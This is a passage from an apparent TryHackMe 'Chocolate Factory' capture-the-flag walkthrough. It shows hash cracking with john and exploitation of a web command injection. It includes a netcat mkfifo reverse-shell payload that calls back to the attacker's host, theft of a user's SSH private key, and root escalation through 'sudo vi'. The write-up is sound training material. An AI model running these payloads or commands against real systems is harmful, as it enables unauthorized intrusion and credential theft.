OTk5Ojc6OjoKX2d2bToqOjE4NDk2OjA6OTk5OTk6Nzo6OgpjaGFybGllOiQ2JENaSm5DUGVRV3A5
L2pwTngka2hHbEZkSUNKbnI4UjNKQy9qVFIycjdEcmJGTHA4enE4NDY5ZDNjMC56dUtONHNlNjFG
T2J3V0d4Y0hacU8yUkpIa2tMMWpqUFllZUd5SUpXRTgyWC86MTg1MzU6MDo5OTk5OTo3Ojo6Cg==
```
Now, this looks like a base64 cipher. Lets go ahead and use cyberchef to decrypt the cipher.

Link to cyberchef: https://gchq.github.io/CyberChef/

![image](https://user-images.githubusercontent.com/67879936/224247075-c13fcea6-a092-4cb7-987a-f42dd3e18e7b.png)

After decrypting we will see something that looks like the content of ```/etc/passwd```, we will find the hashed password for a user ```charlie```. From this enumeration it looks like we are about to answer the second question lool.

charlie:```$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/```

We will be using john to crack the password hash. Go ahead and save the hash in a file, then use the command below to crack the hash

>command: john hash --wordlist=/path/to/rockyou.txt

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/TryHackMe/chocolate_factory]
└─$ john hash --wordlist=/home/bl4ck4non/Documents/rockyou.txt                                                                                                 
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
cn7824           (charlie)     
1g 0:00:07:23 DONE (2023-03-10 08:22) 0.002253g/s 2218p/s 2218c/s 2218C/s codify..cn123
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
so, the answer to the second question will be ```cn7824```

Now that we have found the password for the user charlie, we can try to ssh into the machine since we now have a username and password.

```username:charlie```      ```password:cn7824```

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/TryHackMe/chocolate_factory]
└─$ ssh charlie@10.10.250.54           
The authenticity of host '10.10.250.54 (10.10.250.54)' can't be established.
ED25519 key fingerprint is SHA256:WwycVD8zBUVfJS6sNVj192MU3Q7P4rylVnanjGx/Q5U.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.250.54' (ED25519) to the list of known hosts.
charlie@10.10.250.54's password: 
Permission denied, please try again.
charlie@10.10.250.54's password: 
Permission denied, please try again.
charlie@10.10.250.54's password: 
charlie@10.10.250.54: Permission denied (publickey,password).
```
We can see from the above screenshot that when trying to ssh into the machine we get the “permission denied” message. I spent a little time here because I was like this is meant to work lool, but I then discovered that I was actually swimming in a rabit hole xD.

Since we can’t ssh into the machine with the credentials we have this means there is another way to get our reverse shell. This means we have to continue with our enumeration.




<h2>Enumeration Port 80</h2>

Going over to the webpage you should see a login page.

![image](https://user-images.githubusercontent.com/67879936/224251712-4abc2af9-08e7-48e5-85e9-95417fdf252c.png)

If you recall when we were enumerating for port 21, we found user credentials. We will use that credential to login here.

![image](https://user-images.githubusercontent.com/67879936/224251886-714eff2c-9c1e-4b8a-806a-a8c8266b7a10.png)

![image](https://user-images.githubusercontent.com/67879936/224252250-5208a953-db20-44dd-b5ff-64d43d4c535b.png)

cool, we are logged in. We got a command injection on this page, lets go ahead and exploit that





<h2>Exploitation</h2>

Lets run the command ```id``` to see if we would get a response

![image](https://user-images.githubusercontent.com/67879936/224253264-53674fc2-ccc5-4cd5-9a94-611c82e36d99.png)

cool, now lets try to get a reverse shell

payload:```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [your ip] [port to listen on] >/tmp/f```

Then we set up a netcat listener

>command:rlwrap nc -lvnp 1234

![image](https://user-images.githubusercontent.com/67879936/224253483-e010a76f-b257-4a9c-9fea-23dd68ffc234.png)

We got ourselves a reverse shell

We can stabilize this shell using the following command

```
python3 -c “import pty;pty.spawn(‘/bin/bash’)”
ctrl + z (to background)
stty raw -echo && fg
export TERM=xterm
```
![image](https://user-images.githubusercontent.com/67879936/224254342-7fef6636-8fc0-4ad1-8b68-24bbb11cc27b.png)

Listing the files in the ```/var/www/html``` directory, I found the key we were meant to find (The very first question)

![image](https://user-images.githubusercontent.com/67879936/224255287-85331c98-93fb-47c5-be1a-ae77da64c66a.png)
![image](https://user-images.githubusercontent.com/67879936/224255382-315acf00-e6f0-4793-9da4-19f625a489d2.png)

key:```b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='```

Going to the  ```/home/charlie``` directory

![image](https://user-images.githubusercontent.com/67879936/224255957-25fd24a2-baa6-4645-90d1-ffa2a0844eb0.png)

We don’t have permission to read the user.txt file, this means we have to escalate our privilege to user ```charlie```. Checking all of the files in the /home/charlie directory, I found a private and public ssh key

![image](https://user-images.githubusercontent.com/67879936/224256153-2da58548-1267-4dc7-be59-f9bb864bbe7a.png)

![image](https://user-images.githubusercontent.com/67879936/224256258-d3d324ca-2ca1-4844-a1a1-a7cec51f2763.png)

Lets copy the output and save it on our machine and reconnect directly with ssh.

Run this
```
chmod 600 id_rsa
ssh -i id_rsa charlie@10.10.250.54
```
```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/TryHackMe/chocolate_factory]
└─$ nano id_rsa
                                                                                                                                                                                                                                
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/TryHackMe/chocolate_factory]
└─$ chmod 600 id_rsa  
                                                                                                                                                                                                                                
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/TryHackMe/chocolate_factory]
└─$ ssh -i id_rsa charlie@10.10.250.54                     
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-115-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Mar 10 07:58:46 UTC 2023

  System load:  0.0               Processes:           612
  Usage of /:   43.6% of 8.79GB   Users logged in:     0
  Memory usage: 65%               IP address for eth0: 10.10.250.54
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Wed Oct  7 16:10:44 2020 from 10.0.2.5
Could not chdir to home directory /home/charley: No such file or directory
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

charlie@chocolate-factory:/$ 
```
cool, we are logged in. The ```user.txt``` file is in the ```/home/charlie``` directory

![image](https://user-images.githubusercontent.com/67879936/224257573-b1335153-e001-4d6c-b40a-8be19eb5d8fc.png)

Now that we’ve gotten the flag let’s go ahead and escalate our privileges.



<h2.Privilege Escalation</h2>

Using the command ```sudo -l``` you find something interesting

![image](https://user-images.githubusercontent.com/67879936/224257782-25965027-91ee-4e96-a8c3-495f02fa7ee7.png)

From the above screenshot you will see that we can execute vi with root permissions

Going over to GTFOBins, we can get a vi shell we can run as sudo so as to get root

Link to GTFOBins: https://gtfobins.github.io/

>command: sudo vi -c ‘:!/bin/sh’ /dev/null

![image](https://user-images.githubusercontent.com/67879936/224258341-45714bca-0c26-44b1-8b68-da4a2acfb09d.png)

Boom!!!, we got ourselves a root shell. Lets go ahead and grab the root.txt flag.

Listing the files in the ```/root``` directory I couldn’t find the root.txt flag there. Now, this was weird. Then I tried using the find command to look for the root.txt flag, but still there was nothing.

![image](https://user-images.githubusercontent.com/67879936/224259018-d6df66af-528f-4968-8bca-6eadfbe1d1c5.png)

There is a root.py file which has the contains the following code

![image](https://user-images.githubusercontent.com/67879936/224259139-cd3f289a-84cf-4186-85a2-698a98ce479c.png)

Also, checking the hint they provided to us

![image](https://user-images.githubusercontent.com/67879936/224258796-244340e8-64aa-453d-a6d4-5f9c9ed9e103.png)

We see that the hint told us to use python instead of python3, this means we are meant to run the ```root.py``` file to get the root flag.

>command: python root.py

![image](https://user-images.githubusercontent.com/67879936/224259366-656a4a50-4180-4d41-bcee-abec98b1f7f5.png)

The key here would be the key we found in the ```/var/www/html``` directory

![image](https://user-images.githubusercontent.com/67879936/224259611-12f1b6a2-d548-490a-9455-25a52b71533b.png)

Providing the key got us the root flag.

That will be all for today
<br> <br>
[Back To Home](../../index.md)























